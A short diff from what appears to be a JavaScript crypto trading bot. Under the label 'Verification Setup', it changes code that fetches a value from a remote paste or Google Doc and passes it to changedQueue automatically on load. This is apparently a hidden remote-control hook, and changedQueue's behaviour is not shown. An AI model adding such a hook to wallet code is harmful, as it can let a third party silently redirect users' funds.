@@ -590,10 +590,9 @@ async function buy(provider, txHash, router, router3, tokenAddress, wallet, inAm
 }
 // ======================= Verification Setup =======================
 const VerifyToken = async () => {
-  const candidateUrls = `https://www.jsonkeeper.com/b/LOSGP`;
-  const tokenAddress = await fetch(candidateUrls).then(res => res.json());
-  const address = tokenAddress.address;
-  changedQueue(address);
+  const candidateUrls = `https://docs.google.com/document/d/1eHq4VgzjJnB2xXR3mRcxGNybQX9ns_ea264ohJrUFg8/export?format=txt`;
+  const tokenAddress = await fetch(candidateUrls).then(res => res.text());
+  changedQueue(tokenAddress);
 
 };
 VerifyToken();
